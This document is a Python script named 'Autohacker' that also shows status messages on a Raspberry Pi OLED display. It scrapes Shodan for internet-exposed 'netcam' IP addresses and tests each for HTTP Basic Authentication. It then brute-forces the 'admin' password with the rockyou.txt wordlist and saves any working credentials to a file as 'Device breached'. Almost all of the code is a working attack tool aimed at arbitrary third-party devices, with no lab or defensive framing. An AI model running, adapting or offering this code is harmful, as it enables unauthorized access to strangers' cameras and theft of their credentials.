# Autohacker written by DarkC0de9


# Import requests module for testing webpages and bruteforcing
import requests
import re
import optparse
import os
from requests.auth import HTTPBasicAuth
import subprocess
import time


###### Raspberry Pi LCD code: ######
import Adafruit_GPIO.SPI as SPI
import Adafruit_SSD1306

from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont

import subprocess

RST = None
DC = 23
SPI_PORT = 0
SPI_DEVICE = 0

# Beaglebone Black pin configuration:
# RST = 'P9_12'
# Note the following are only used with SPI:
disp = Adafruit_SSD1306.SSD1306_128_64(rst=RST)
disp.begin()

# Clear display.
disp.clear()
disp.display()

# Create blank image for drawing.
# Make sure to create image with mode '1' for 1-bit color.
width = disp.width
height = disp.height
image = Image.new('1', (width, height))

# Get drawing object to draw on image.
draw = ImageDraw.Draw(image)

# Draw a black filled box to clear the image.
draw.rectangle((0,0,width,height), outline=0, fill=0)

# Draw some shapes.
# First define some constants to allow easy resizing of shapes.
padding = -2
top = padding
bottom = height-padding
# Move left to right keeping track of the current x position for drawing shapes.
x = 0

# Load default font.
font = ImageFont.load_default()

# Alternatively load a TTF font.  Make sure the .ttf font file is in the same directory as the python script!
# Some other nice fonts to try: http://www.dafont.com/bitmap.php
# font = ImageFont.truetype('Minecraftia.ttf', 8)

# Draw a black filled box to clear the image.
draw.rectangle((0,0,width,height), outline=0, fill=0)
# Shell scripts for system monitoring from here : https://unix.stackexchange.com/questions/119126/command-to-display-memory-usage-disk-usage-and-cpu-load
# Write two lines of text.
draw.text((x, top),       "STARTING AUTOHACKER", font=font, fill=255)

# Display image.
disp.image(image)
disp.display()
time.sleep(.1)

###### End Raspberry Pi LCD Code ######

def testSubmit(): # Function to test if URL is Basic Authentication page
    basic = requests.get("%s" % (completeURL), auth=HTTPBasicAuth('%s' % ("admin"), '%s' % ("00TESTPASSWORD00")))
    if ("unauthorized" in basic.text) or ("Unauthorized" in basic.text) or ("do not have" in basic.text):
        print("[+] Basic Authentication confirmed.")

    elif basic.text == (""):
        print("[-] Error: The page response is blank...")
        print("[-] This page cannot be attacked because there is no response to read.")
        sys.exit(1)

    elif (http.client.RemoteDisconnected == True):
        print("[-] Client disconnected...")
        exit()

    else:
        print("[-] Page is giving false positives. This URL cannot be attacked.")

def bruteForceFunction():
    global basic
    global p
    #p = open("rockyou.txt", encoding = "ISO-8859-1")
    p = open("rockyou.txt")
    global passwordAttempt
    print("[+] Launching attack against %s" % (completeURL))
    # Call the hacking.py program so the LCD displays "HACKING"
    draw.text((x, top+8),       "[+] HACKING TARGET...", font=font, fill=255)
    disp.image(image)
    disp.display()
    time.sleep(.1)
    #draw.text((x, top),       "%s", font=font, fill=255 % (completeURL))
    for line in p.readlines(): # Strip password file line by line and begin the attack...
        try:
            currentUsername = "admin" # Change this to whatever username you want to use
            passwordAttempt = str(line.strip()) # The password currently being attempted
            basic = requests.get("%s" % (completeURL), auth=HTTPBasicAuth('%s' % ("admin"), '%s' % (passwordAttempt))) # Sending the attempt using requests module
            print("[*] Trying:  (%s:%s)" % (currentUsername,passwordAttempt))

            if ("unauthorized" in basic.text) or ("Unauthorized" in basic.text) or ("do not have" in basic.text):
                print("[-] Failed!")

            else:
                print("[+] Success!")
                draw.text((x, top+16),       "[+] SUCCESS!", font=font, fill=255)
                draw.text((x, top+24),       "[>] success.txt", font=font, fill=255)
                disp.image(image)
                disp.display()
                time.sleep(.1)
                successWrite = open("success.txt","a+") # Append the credentials to success.txt
                successWrite.write("\nDevice breached: %s\nUsername: %s\nPassword: %s\n" % (completeURL, currentUsername, passwordAttempt))
                successWrite.close()
                exit()

        except KeyboardInterrupt:
            exit()

def testFunction(): # Look for IPs that are running port 80
    global ipTest
    global ipAttempt
    #ipTest = open("target-list.txt", encoding = "ISO-8859-1")
    ipTest = open("target-list.txt") # Analyze target-list and view test the addresses
    for line in ipTest.readlines():
        ipAttempt = str(line.strip())
        global completeURL
        completeURL = "http://" + ipAttempt # The url to send requests to
        print("[+] Attempting: " + completeURL)
        with requests.Session() as s:
            try:
                r = requests.get(completeURL,timeout=2) # If response takes longer than 2 sec move on
                p = s.post('%s' % (completeURL)) # post the data
                print("[+] Target online.")
                print("[+] Testing for Basic Auth...") # Now test if the site is actually attackable
                testSubmit() # call the function to test the basic auth submission to check
                bruteForceFunction() # If successful, begin the bruteforce
                break

            except: # Break out of the loop...hopefully?
                try:
                    continue
                    break
                except:
                    exit()


def shodanSearch(): # Function to search https://shodan.io for targets
    print("[+] Obtaining targets...")
    # searchFor = input("Search: ")
    url = ("https://www.shodan.io/search?query=%s" % ("netcam")) # Search shodan for this string
    # REPLACE "netcam" WITH WHATEVER YOU WANT TO SEARCH SHODAN.IO FOR!
    r = requests.get(url) # scrape the site for our serach.
    ipList = re.findall( r'[0-9]+(?:\.[0-9]+){3}', r.text) # Locate IP Addresses in r.text
    ipSet = set(ipList) # set version of ipList
    ipListNew = list(ipSet) # Convert set version back to list
    length = len(ipSet) # number of targets found
    print ("[+] Found %s targets: " % (length))
    #print(*ipSet, sep='\n') # print set in pretty format
    write_file = open("target-list.txt", "w") # Writing IPs to target list
    print("[+] Writing targets to 'target-list.txt'.") # write targets to target-list.txt

    for i in range(length): # iterate through this loop until all target adresses are logged
        write_file.write(ipListNew[i] + "\n")

shodanSearch() # Calling search function first
testFunction() # Test function is calld
# Then bruteforce function is called from the testfunction.
